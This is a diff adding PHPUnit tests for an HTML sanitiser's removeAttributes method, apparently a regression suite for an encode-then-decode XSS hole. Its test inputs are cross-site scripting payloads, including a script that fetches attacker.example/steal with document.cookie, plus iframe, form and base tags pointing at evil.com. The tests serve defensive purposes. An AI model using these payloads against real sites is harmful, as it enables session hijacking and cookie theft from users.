@@ -318,7 +318,69 @@ class FilterTest extends TestCase
         $html = '<svg onload=alert(1)>';
         $result = Filter::removeAttributes($html);
 
-        $this->assertStringNotContainsString('onload', $result);
+        $this->assertStringNotContainsString('<svg', $result);
+    }
+
+    public function testRemoveAttributesStripsScriptTags(): void
+    {
+        $html = 'Safe content<script>alert(document.cookie)</script> more content';
+        $result = Filter::removeAttributes($html);
+
+        $this->assertStringNotContainsString('<script>', $result);
+        $this->assertStringNotContainsString('alert(document.cookie)', $result);
+        $this->assertStringContainsString('Safe content', $result);
+        $this->assertStringContainsString('more content', $result);
+    }
+
+    public function testRemoveAttributesStripsIframeTags(): void
+    {
+        $html = 'Before<iframe src="https://evil.com"></iframe>After';
+        $result = Filter::removeAttributes($html);
+
+        $this->assertStringNotContainsString('<iframe', $result);
+        $this->assertStringNotContainsString('</iframe>', $result);
+        $this->assertStringContainsString('Before', $result);
+        $this->assertStringContainsString('After', $result);
+    }
+
+    public function testRemoveAttributesStripsObjectEmbedTags(): void
+    {
+        $html = '<object data="evil.swf"><embed src="evil.swf"></object>';
+        $result = Filter::removeAttributes($html);
+
+        $this->assertStringNotContainsString('<object', $result);
+        $this->assertStringNotContainsString('<embed', $result);
+    }
+
+    public function testRemoveAttributesStripsJavascriptUri(): void
+    {
+        $html = '<a href="javascript:alert(1)">click</a>';
+        $result = Filter::removeAttributes($html);
+
+        $this->assertStringNotContainsString('javascript:', $result);
+        $this->assertStringContainsString('click', $result);
+    }
+
+    public function testRemoveAttributesStripsFormAndBaseTags(): void
+    {
+        $html = '<form action="https://evil.com"><input name="q"><base href="https://evil.com">';
+        $result = Filter::removeAttributes($html);
+
+        $this->assertStringNotContainsString('<form', $result);
+        $this->assertStringNotContainsString('<base', $result);
+    }
+
+    public function testRemoveAttributesHandlesEncodeThenDecode(): void
+    {
+        // Simulates the actual vulnerable pipeline: FILTER_SANITIZE_SPECIAL_CHARS -> html_entity_decode -> removeAttributes
+        $userInput = 'Helpful content<script>fetch("https://attacker.example/steal?c="+document.cookie)</script>';
+        $filtered = Filter::filterVar($userInput, FILTER_SANITIZE_SPECIAL_CHARS);
+        $decoded = html_entity_decode((string) $filtered, ENT_QUOTES | ENT_HTML5, 'UTF-8');
+        $result = Filter::removeAttributes($decoded);
+
+        $this->assertStringNotContainsString('<script>', $result);
+        $this->assertStringNotContainsString('fetch(', $result);
+        $this->assertStringContainsString('Helpful content', $result);
     }
 
     public function testRemoveAttributesWithMixedQuoteStyles(): void
